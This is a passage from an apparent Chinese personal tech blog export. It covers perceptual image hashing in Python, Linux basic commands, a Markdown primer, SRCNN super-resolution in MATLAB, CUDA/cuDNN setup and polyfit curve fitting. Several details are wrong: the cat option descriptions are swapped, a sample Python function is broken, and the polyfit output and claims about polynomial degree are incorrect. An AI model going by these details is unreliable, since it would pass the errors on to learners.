id="感知哈希算法"><a href="#感知哈希算法" class="headerlink" title="感知哈希算法"></a>感知哈希算法</h3><pre class=" language-lang-python"><code class="language-lang-python">from time import *begin_time = time()import cv2import numpy as npimport os#感知哈希算法def pHash(image):    image = cv2.resize(image,(32,32), interpolation=cv2.INTER_CUBIC)    image = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)#     cv2.imshow('image', image)#     cv2.waitKey(0)#     cv2.destroyAllWindows()    # 将灰度图转为浮点型，再进行dct变换    dct = cv2.dct(np.float32(image))#     print(dct)    # 取左上角的8*8，这些代表图片的最低频率    # 这个操作等价于c++中利用opencv实现的掩码操作    # 在python中进行掩码操作，可以直接这样取出图像矩阵的某一部分    dct_roi = dct[0:8,0:8]    avreage = np.mean(dct_roi)    hash = []    for i in range(dct_roi.shape[0]):        for j in range(dct_roi.shape[1]):            if dct_roi[i,j] > avreage:                hash.append(1)            else:                hash.append(0)    return hash#计算汉明距离def Hamming_distance(hash1,hash2):    num = 0    for index in range(len(hash1)):        if hash1[index] != hash2[index]:            num += 1    return numif __name__ == "__main__":    image_file1 = 'images/WIN_20200111_21_56_10_Pro.jpg'    image_file2 = 'images/1.jpg'    img1 = cv2.imread(image_file1)    img2 = cv2.imread(image_file2)    hash1 = pHash(img1)    hash2 = pHash(img2)    dist = Hamming_distance(hash1, hash2)    #将距离转化为相似度    similarity = 1 - dist * 1.0 / 64    print(dist)    print(similarity)end_time = time()run_time = end_time-begin_timeprint ('该程序运行时间：',run_time)</code></pre><div class="table-container"><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>distance</th><th>similarity</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>0.20314764976501465</td><td>0</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>0.2085726261138916</td><td>4</td><td>0.9375</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>0.20518183708190918</td><td>0</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.20314764976501465</td><td>5</td><td>0.921875</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.18751096725463867</td><td>8</td><td>0.875</td></tr></tbody></table></div><h2 id="3-评价"><a href="#3-评价" class="headerlink" title="3.评价"></a>3.评价</h2><ul><li>直方图计算结果与直观视觉严重不符合</li><li>余弦相似度准确度较高，但太耗时，比对平均耗时19s</li><li>互信息的方法从耗时和准确度上粗略观察，介于直方图和余弦相似度之间</li><li>感知哈希算法耗时较为可接受，且比对结果较有区分度且符合直观视觉</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="2019/11/21/linux-ji-chu-ming-ling/"/>
      <url>2019/11/21/linux-ji-chu-ming-ling/</url>
      
        <content type="html"><![CDATA[<pre class=" language-lang-shell"><code class="language-lang-shell">command [-options] [parameter]</code></pre><div class="table-container"><table><thead><tr><th>command</th><th>[-options]</th><th>[parameter]</th></tr></thead><tbody><tr><td>命令名称</td><td>选项</td><td>传递给命令的参数</td></tr></tbody></table></div><h2 id="help-amp-amp-man"><a href="#help-amp-amp-man" class="headerlink" title="help&amp;&amp;man"></a>help&amp;&amp;man</h2><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><code>command --help</code><br> 显示command 命令的帮助信息</p><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><p><code>man command</code><br> 查询command 命令的使用手册</p><blockquote><p>man 是<strong><em>manual</em></strong>的缩写，是Linux提供的手册。</p></blockquote><h3 id="手册中的操作按键"><a href="#手册中的操作按键" class="headerlink" title="手册中的操作按键"></a>手册中的操作按键</h3><div class="table-container"><table><thead><tr><th>操作按键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示下一页</td></tr><tr><td>回车键</td><td>显示下一行</td></tr><tr><td>b</td><td>back，显示上一页</td></tr><tr><td>f</td><td>forward，向前和空格效果一样</td></tr><tr><td>q</td><td>quit，退出</td></tr></tbody></table></div><h2 id="常用的Linux命令"><a href="#常用的Linux命令" class="headerlink" title="常用的Linux命令"></a>常用的Linux命令</h2><p>有了上面的基本常识之后，我们终于可以开始尝试Linux的命令了！接下来给大家介绍几个简单的命令。</p><div class="table-container"><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>ls</td><td>list，列表显示当前目录下的内容</td></tr><tr><td>pwd</td><td>print wrok directory ，查看当前所在路径</td></tr><tr><td>cd+空格+路径名称</td><td>change directory,跳转到指定路径</td></tr><tr><td>touch+空格+文件名称</td><td>创建这个文件</td></tr><tr><td>mkdir+空格+文件夹名称</td><td>make directory， 创建这个文件夹</td></tr><tr><td>rm+空格+文件名</td><td>remove,删除指定的文件</td></tr><tr><td>clear</td><td>清屏</td></tr></tbody></table></div><h2 id="常用的Linux命令选项"><a href="#常用的Linux命令选项" class="headerlink" title="常用的Linux命令选项"></a>常用的Linux命令选项</h2><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><p>ls是英文单词list的缩写，他的功能是列出当前目录下的文件列表，是非常常见的Linux命令之一。</p><h5 id="Linux下目录特点"><a href="#Linux下目录特点" class="headerlink" title="Linux下目录特点"></a>Linux下目录特点</h5><ul><li>以 <code>.</code> 开头的文件是隐藏文件，使用ls查看时，需要加上 <code>-a</code>（all）参数才能显示。</li><li><code>.</code>代表当前目录 <code>..</code>代表上一级目录(可以理解为隐藏的两个文件路径)。我们常用<code>cd..</code>跳到上一级目录。</li></ul><h3 id="ls常用选项"><a href="#ls常用选项" class="headerlink" title="ls常用选项"></a>ls常用选项</h3><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-a]</td><td>all，显示所有内容，包含隐藏文件</td></tr><tr><td>[-l]（字母L小写）</td><td>显示文件详细信息</td></tr><tr><td>[-h]</td><td>human-readable,需要配合<code>-l</code>(字母L小写)选项，所谓的人性化显示</td></tr></tbody></table></div><h3 id="ls配合通配符"><a href="#ls配合通配符" class="headerlink" title="ls配合通配符"></a>ls配合通配符</h3><div class="table-container"><table><thead><tr><th>通配符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>代表任意多个任意字符，可以没有字符</td></tr><tr><td>?</td><td>代表就是一个任意字符，至少一个字符</td></tr><tr><td>[ ]</td><td>代表一个字符，取值范围在[ ]中</td></tr><tr><td>[1234 ]</td><td>匹配1，2，3，4中的任意一个</td></tr><tr><td>[a-g]</td><td>匹配从a到g范围内的任意一个</td></tr></tbody></table></div><h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p><code>cd</code>是英文单词 <strong><em>change directory\</em></strong> 的缩写，其功能就是跳转目录。<br> 它与之前的几个命令不同的是，<code>cd</code>是BASH内置命令，没有帮助文档与相关手册。<br> 所以在使用<code>$which cd</code>的时候是看不到它的二进制路径的。因为系统中不存在 cd 命令的二进制文件。</p><blockquote><p><strong>注意</strong>：Linux下 <strong><em>目录名称</em></strong> 以及 <strong>文件名称</strong> <strong>大小写</strong>是有区别的！</p></blockquote><div class="table-container"><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>cd</td><td>切换到当前用户的家目录（home/用户名）</td></tr><tr><td>cd ~</td><td>和 cd 效果一样</td></tr><tr><td>cd ..</td><td>跳转到上一级目录</td></tr><tr><td>cd -</td><td>在最近两个目录来回切换，有点像图形界面的 Alt + Tab切换窗口的感觉</td></tr></tbody></table></div><p><code>cd</code>后面的路径可以是两种 <strong>相对路径</strong> 和 <strong>绝对路径</strong></p><ul><li><strong>相对路径</strong>是指相对当前目录的路径</li><li><strong>绝对路径</strong>是指全路径。可以从 /（根目录）开始，或者是~（家目录）开始。</li></ul><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><ul><li>创建一个新的目录</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-p]</td><td>可以递归创建目录</td></tr></tbody></table></div><blockquote><p>新建的目录名称不能重名</p></blockquote><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><ul><li>删除文件或目录</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-f]</td><td>强制删除，忽略不存在的文件，无需提示</td></tr><tr><td>[-r]</td><td>递归删除目录下的内容，删除<strong>文件夹</strong>就用这个选项</td></tr></tbody></table></div><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><ul><li>拷贝文件或者目录，类似DOS中的copy</li></ul><pre class=" language-lang-bash"><code class="language-lang-bash">$cp 源文件 目标文件</code></pre><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-i]</td><td>interactive互动，说白了就是覆盖文件时有提示</td></tr><tr><td>[-r]</td><td>如果cp跟上的时目录，那么将会递归拷贝目录下的所有子目录和文件</td></tr></tbody></table></div><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><ul><li><code>mv</code>是move的缩写 用来 <strong>移动文件/目录</strong> </li><li>小技巧：如果需要重命名，也可以使用mv命令<strong>覆盖</strong>当前文件/目录 达到效果</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-i]</td><td>interactive,覆盖文件时有提示</td></tr></tbody></table></div><h2 id="tree命令"><a href="#tree命令" class="headerlink" title="tree命令"></a>tree命令</h2><ul><li><code>tree</code>命令可以将目录结构显示出来（树状显示）</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-d]</td><td>directory，只显示目录</td></tr></tbody></table></div><blockquote><p>有的同学系统中默认没有此命令。所以会提示：</p><p> <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2990730-7545ff5d5b44b0bb.webp" alt="img"> </p></blockquote><p>你看写得多清楚,在Ubuntu下使用apt安装。</p><pre class=" language-lang-csharp"><code class="language-lang-csharp">$ sudo apt-get install tree</code></pre><h2 id="查看文件内容相关命令"><a href="#查看文件内容相关命令" class="headerlink" title="查看文件内容相关命令"></a>查看文件内容相关命令</h2><div class="table-container"><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>cat 文件名</td><td>concatenate,查看文件内容、创建文件、文件合并、追加文件内容等</td></tr><tr><td>more 文件名</td><td>more,分屏显示文件内容（内容多一般用more）</td></tr><tr><td>grep 搜索内容 文件名</td><td>grep，搜索文件内容</td></tr></tbody></table></div><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><ul><li>查看文件内容、创建文件、文件合并、追加文件内容等</li><li>命令会一次性显示所有内容，所以适合查看内容较少的文件</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-b]</td><td>显示每一行的行号</td></tr><tr><td>[-n]</td><td>只显示有内容的行号，空行不算一行</td></tr></tbody></table></div><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><ul><li>此命令可以分屏显示文件内容，每次只显示一页内容。所以适合查看内容多的文件。<br> 使用<code>more</code>的操作按键</li></ul><div class="table-container"><table><thead><tr><th>操作按键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示下一页</td></tr><tr><td>回车键 Enter</td><td>显示下一行</td></tr><tr><td>b</td><td>back，显示上一页</td></tr><tr><td>f</td><td>forward，向前和空格效果一样</td></tr><tr><td>q</td><td>quit，退出</td></tr><tr><td>/ 搜索文字</td><td>搜索文本中的内容</td></tr></tbody></table></div><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><ul><li>（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</li></ul><div class="table-container"><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>[-n]</td><td>line-number，显示匹配行及行号</td></tr><tr><td>[-v]</td><td>invert-match，选中不匹配的行</td></tr><tr><td>[-i]</td><td>ignore-case，忽略大小写</td></tr></tbody></table></div><h4 id="grep常用查找方式"><a href="#grep常用查找方式" class="headerlink" title="grep常用查找方式"></a>grep常用查找方式</h4><ul><li>在file_name中 搜索Hello_world这个单词</li></ul><pre class=" language-lang-bash"><code class="language-lang-bash">$grep Hello_world file_name$grep "Hello_world" file_name</code></pre><ul><li>在多个文件中查找</li></ul><pre class=" language-lang-bash"><code class="language-lang-bash">grep "Hello_world" file_1 file_2 file_3 ...</code></pre><ul><li>常用两种模式查找</li></ul><div class="table-container"><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>^hello</td><td>行首，搜索以hello开头的行</td></tr><tr><td>world$</td><td>行尾，搜索以world结束的行</td></tr></tbody></table></div><h2 id="几个常用符号"><a href="#几个常用符号" class="headerlink" title="几个常用符号"></a>几个常用符号</h2><h3 id="重定向符号"><a href="#重定向符号" class="headerlink" title="重定向符号"></a>重定向符号</h3><ul><li>Linux中允许将命令执行结果 <strong>重定向</strong>到一个文件</li><li>将本应该显示在<strong>终端上的内容  输出/追加</strong> 到<strong>指定文件中</strong> </li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td>&gt;</td><td>输出重定向到一个文件或设备 覆盖原来的文件</td></tr><tr><td>&gt;&gt;</td><td>输出重定向到一个文件或设备 追加原来的文件</td></tr></tbody></table></div><ul><li><code>echo</code>会在终端中显示参数指定的文字，通常会和 <strong>重定向</strong> 联合使用</li></ul><h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号 |"></a>管道符号 |</h3><ul><li>Linux 允许将 <strong>一个命令的输出</strong> 可以 <strong>通过管道</strong> 做为 <strong>另外一个命令的输入</strong> </li></ul><pre class=" language-lang-bash"><code class="language-lang-bash"> command 1 |  command 2 |  command 3 … …</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/abbd06b1ff27" target="_blank" rel="noopener">002—Linux终端命令简介  请叫我Hank</a></p><p><a href="https://www.jianshu.com/p/288499cf29ea" target="_blank" rel="noopener">003—Linux常用命令的常见选项 请叫我Hank</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown精简教程</title>
      <link href="2019/11/15/markdown-jing-jian-jiao-cheng/"/>
      <url>2019/11/15/markdown-jing-jian-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么要用markdown？"><a href="#为什么要用markdown？" class="headerlink" title="为什么要用markdown？"></a>为什么要用markdown？</h2><p>emmm……word相比markdown，其优点在于不用排版（word不刻意去排版真的很难看）</p><p>对新手来说，会觉得这纯粹找事，但是熟练之后不管是做笔记还是会议记录，甚至是写论文markdown都比已有的工具方便得多。</p><p>此外markdown支持html和 latex 语法（word也支持latex，但那个渲染真的无语了）</p><p>看看这么多人都用markdown，大部分都是刚学的时候觉得啥玩意？~之后，真香</p><p>你能相信下面的全是用markdown写出来的吗？（只要动键盘就行了）</p><p>水平分割线</p><hr><ul><li>支持latex</li></ul><script type="math/tex; mode=display">y_{\theta}=\sum_{i=1}^n   \int_0^{+\infty}\frac{\sigma}{x^2} dx</script><ul><li>代码块~语法高亮</li></ul><pre class=" language-lang-python"><code class="language-lang-python">import cv2import numpy as npdef cv_imread(file_path):                 cv_img=cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), -1)                 cv_img = cv2.IMREAD_GRAYSCALE(img)        return cv_img</code></pre><ul><li>流程图</li></ul><pre class="mermaid">graph LRA[信源]-->B[发送设备]B[发送设备]-->C[信道]D[噪声源]-->C[信道]C[信道]-->E[接收设备]E[接收设备]-->F[信宿]</pre><ul><li>有序列表</li></ul><ol><li>任务A</li><li>任务B<ol><li>任务C</li><li>任务D</li></ol></li></ol><ul><li>无序列表</li><li>列表<ul><li>A</li><li>B<ul><li>D<ul><li>E</li></ul></li></ul></li><li>C</li></ul></li></ul><p><strong>加粗</strong>、<em>斜体</em>、<u>下划线</u></p><p><a href="https://www.baidu.com/" target="_blank" rel="noopener">超链接</a></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" alt="引入图像"></p><ul><li><p>支持html，例如用html的<kbd>img</kbd>标签引入图像,<kbd>center</kbd>标签控制居中，<kbd>width</kbd>控制图片大小</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/paper/caiwei_study_2020.3-1.jpg" width="30%"/></center></li></ul><ul><li><p>表格</p><p>| A    |  B   |    C |<br>| —— | :—: | —-: |<br>| 哈哈 | 呵呵 | 嗯哼 |</p></li></ul><p>编写的文档很自然地可以导出成<kbd>html</kbd>或者<kbd>PDF</kbd>、<kbd>word</kbd>等,图像品质不会压缩。另外大多数博客平台都支持markdown排版，例如这篇就是用markdown写的(都是统一的，就不会像word那样出现乱码或者排版不对这些情况)。相比word，markdown更简洁，功能较少但能让人<strong>专注于写作</strong>（就是不需要去排版，但排版仍然会很好看）</p><hr><p>如果刚开始用不熟悉，也不是非得用键盘，有些markdown编辑软件支持鼠标点击打开某项功能，比如黑体、代码块，表格等。</p><p>常见的一些markdown语法（其实语法不多，但一开始就记一堆，难免会让人难以接受，建议先掌握下面这些常用的，以后用写笔记markdown编辑器代替word就好啦，<strong>用过几次后自然熟悉</strong>）</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>一级标题: <kbd>#</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd></p><p>二级标题: <kbd>##</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd> </p><p>……</p><p>六级标题: <kbd>######</kbd>+<kbd>空格</kbd>+<kbd>文字</kbd></p><h2 id="黑体斜体"><a href="#黑体斜体" class="headerlink" title="黑体斜体"></a>黑体斜体</h2><p><kbd> * </kbd>  + <kbd>文字</kbd>+ <kbd> * </kbd>让文字变成斜体，注意中间不带空格，如：</p><p><em>文字</em></p><p><kbd><em> </em></kbd>+<kbd>文字</kbd>+ <kbd>**</kbd>  让文字变成黑体，注意中间不带空格，如：</p><p><strong>文字</strong></p><p>只一个<kbd>*</kbd>+<kbd>空格</kbd> 会出现一个点，如：</p><ul><li></li></ul><p>连续输入三个<kbd>*</kbd>会变成分割线，如:</p><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p><kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>[</kbd>  有序列表</p><p><kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>]</kbd>   无序列表</p><h2 id="代码块和公式块"><a href="#代码块和公式块" class="headerlink" title="代码块和公式块"></a>代码块和公式块</h2><p>代码块： <kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>K</kbd>  </p><p>latex公式块： <kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>M</kbd>  </p><p>这些是基础操作，如果各位还会写html或latex语法的话更佳，不会也不要紧，掌握上述命令即可自(wu)由(nai)写作。</p><p>markdown编辑器有很多，我个人比较喜欢用typora，附上win10_64位的下载链接，<a href="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/download/typora-setup-x64.exe" target="_blank" rel="noopener">Typora</a></p><p>官网： <a href="https://www.typora.io/" target="_blank" rel="noopener">https://www.typora.io/</a> (官网下载很慢哦)</p><h2 id="emoji表情"><a href="#emoji表情" class="headerlink" title="emoji表情"></a>emoji表情</h2><p>此外还支持一堆emoji表情，不信你看👉 <a href="https://www.webfx.com/tools/emoji-cheat-sheet/" target="_blank" rel="noopener">emoji</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灰度图超分辨率重建</title>
      <link href="2019/11/03/hui-du-tu-chao-fen-bian-lu-chong-jian/"/>
      <url>2019/11/03/hui-du-tu-chao-fen-bian-lu-chong-jian/</url>
      
        <content type="html"><![CDATA[<p><a href="http://mmlab.ie.cuhk.edu.hk/projects/SRCNN/SRCNN_v1.zip" target="_blank" rel="noopener">下载matlab版完整代码</a><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/超分辨-figure1.png" alt="效果图"> </p><pre class=" language-lang-matlab"><code class="language-lang-matlab">close all;clear all;%% 读取真实图像im  = imread('Set5\butterfly_GT.bmp');%im  = imread('Set14\zebra.bmp');%% 设定参数up_scale = 3;model = 'model\x3.mat';% up_scale = 2;% model = 'model\x2.mat'; % up_scale = 4;% model = 'model\x4.mat';%% 仅在照度方面工作if size(im,3)>1    im = rgb2ycbcr(im);    im = im(:, :, 1);endim_gnd = modcrop(im, up_scale);im_gnd = double(im_gnd)/255;%single 这里换成double Matlab 7.0就可以运行了%% 双三次插值im_l = imresize(im_gnd, 1/up_scale, 'bicubic'); %缩小im_b = imresize(im_l, up_scale, 'bicubic');%再放大%% SRCNNim_h = SRCNN(model, im_b);%% 删除边框im_h = shave(uint8(im_h * 255), [up_scale, up_scale]);im_gnd = shave(uint8(im_gnd * 255), [up_scale, up_scale]);im_b = shave(uint8(im_b * 255), [up_scale, up_scale]);%% 计算 PSNRpsnr_bic = compute_psnr(im_gnd,im_b);psnr_srcnn = compute_psnr(im_gnd,im_h);%% 显示结果fprintf('双三次插值的峰值信噪比: %f dB\n', psnr_bic);fprintf('SRCNN 重建的峰值信噪比: %f dB\n', psnr_srcnn);figure, imshow(im_b); title('双三次插值');figure, imshow(im_h); title('SRCNN 重建');imwrite(im_b, ['双三次插值' '.bmp']);imwrite(im_h, ['SRCNN 重建' '.bmp']);</code></pre><p><a href="http://mmlab.ie.cuhk.edu.hk/projects/SRCNN.html" target="_blank" rel="noopener">官方地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习框架GPU版前期准备（避坑指南）</title>
      <link href="2019/10/26/shen-du-xue-xi-kuang-jia-gpu-ban-qian-qi-zhun-bei-bi-keng-zhi-nan/"/>
      <url>2019/10/26/shen-du-xue-xi-kuang-jia-gpu-ban-qian-qi-zhun-bei-bi-keng-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h3 id="深度学习框架安装：前期准备"><a href="#深度学习框架安装：前期准备" class="headerlink" title="深度学习框架安装：前期准备"></a>深度学习框架安装：前期准备</h3><p>前情提要：相信安装过Pytorch、TensorFlow等框架的GPU版的人都知道，相比CPU版本安装，GPU版本的安装多么麻烦。但是，深度学习没GPU又不行啊（单纯靠CPU太慢了），故在此整理了教程上较为稀少的GPU版安装的前期准备，CUDA和CUDNN安装搞定了，剩下都问题不大啦！</p><h4 id="1-下载cuda和cudnn"><a href="#1-下载cuda和cudnn" class="headerlink" title="1.  下载cuda和cudnn"></a>1.  下载cuda和cudnn</h4><p> 下载cudn之前先查看电脑显卡支持的最高版本：<br> 控制面板-硬件和声音-NVIDIA面板-帮助-系统信息<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025195852431.png" alt="在这里插入图片描述"><br> 例如此处则支持10.1.168版本的cuda</p><p>在此我下载cudnn9.0<br>cdunn官网下载：<a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">https://developer.nvidia.com/cuda-toolkit-archive</a><br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200201528.png" alt="在这里插入图片描述"><br>选择适合电脑操作系统的版本，Windows和MAC OSX提供network和local两种版本下载，<strong>建议local</strong>（network版在安装中容易出错）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200311349.png" alt="在这里插入图片描述"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025201549771.png" alt="在这里插入图片描述"><br>安装完成之后等待检测<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025204744530.png" alt="在这里插入图片描述"><br>也可以选择自定义安装，但请记住安装的位置</p><h4 id="2-CUDNN下载"><a href="#2-CUDNN下载" class="headerlink" title="2. CUDNN下载"></a>2. CUDNN下载</h4><p>cudnn下载官网：<a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="noopener">https://developer.nvidia.com/rdp/cudnn-download</a>（注：cudnn下载需要注册登录NVIDIA）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025200722785.png" alt="在这里插入图片描述"><br>下载与cuda对应的cudnn版本<br>将下载得到的cudnn解压包解压，别将cuda/include、cuda/lib、cuda/bin三个目录中的内容拷贝到C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0对应的include、lib、bin目录下即可。<br><img src="https://img-blog.csdnimg.cn/20191025205954318.pngcudnn安装 cudnn不需要安装，解压出来之后有个cudn的文件夹，打开，里面有四个文件![在这里插入图片描述](https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025210047587.png" alt="在这里插入图片描述"><br>将其复制到安装CUDA的位置<br>使用精简（推荐）安装则在以下位置：<br>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0</p><p>（v9.0是版本号，如果是其他版本则对应其他版本的文件夹名称）<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025210211626.png" alt="在这里插入图片描述"></p><h4 id="3-安装Anconada"><a href="#3-安装Anconada" class="headerlink" title="3.  安装Anconada"></a>3.  安装Anconada</h4><p>官网下载：<a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">https://www.anaconda.com/distribution/</a></p><p> 注意选择与操作系统匹配的版本<img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025194017560.png" alt="在这里插入图片描述"><br> <img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025194513642.png" alt="在这里插入图片描述"><br>按照软件一般安装套路安装，但是建议添加环境变量这一步打上gou（否则得自己手动配置环境变量）<br>PS：勾选之后字体会变红色警告，不用管</p><ol><li>下载安装完成进入anoconda Prompt<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20191025193754912.png" alt="在这里插入图片描述"><br>嗯，前期准备到此结束（CUDN和CUDNN以及anoconda安装）<br><a href="https://blog.csdn.net/kan2281123066/article/details/93789303" target="_blank" rel="noopener">pytorch安装</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>曲线拟合</title>
      <link href="2019/09/20/qu-xian-ni-he/"/>
      <url>2019/09/20/qu-xian-ni-he/</url>
      
        <content type="html"><![CDATA[<p>当遇到需要用函数表达自变量及因变量的关系时，往往会遇到许多不能直观地看出类似的函数关系式的情况，例如该组自变量和因变量:</p><ul><li><p>x</p><p>(1:1:10)</p></li><li><p>y</p><p>13 15 57 15 12 16 15 18 98 44 11</p></li></ul><p>PS:表格处的(0:1:10)是matlab的一种写法，表示从0到10以1为间距（步长），即0，1，2……10</p><p>将图像用plot函数画出即下图：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/数据科学/20190920124407573.png" alt="xy&quot;曲线&quot;图（数据用得太少了）"><br>这。。。谁看得出来呀，显然不可能是简单的y=ax+b吧<br>所以接下来会用到polyfit这个函数</p><h4 id="polyfit函数：示例"><a href="#polyfit函数：示例" class="headerlink" title="polyfit函数：示例"></a>polyfit函数：示例</h4><pre class=" language-lang-matlab"><code class="language-lang-matlab">x=(0:1:10);y=x.*x+2;plot(x,y)p=polyfit(x,y,3)  %polyfit(x,y,3)中的3为多项式最高次幂，在这里意为最高是3</code></pre><p>得到结果：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/数据科学/img1fe53f8f6cff405a69960785e4564ab.png" alt="计算结果"></p><p>即得到函数y= - 0.2422 x^3^ + 3.5845 x^2^ -11.2024 x + 25.7133</p><p>在这里是设置成多项式最高次数为3，因为polyfit函数其数学基础是最小二乘法曲线拟合原理。曲线拟合：已知离散点上的数据集，即已知在点集上的函数值，构造一个解析函数（其图形为一曲线）使在原离散点上尽可能接近给定的值，所以<strong>无论设置多项式次数为多少，理论上得到的结果都是正确的</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模常用的分析法MATLAB实现</title>
      <link href="2019/09/20/shu-xue-jian-mo-chang-yong-de-fen-xi-fa-ji-qi-matlab-shi-xian/"/>
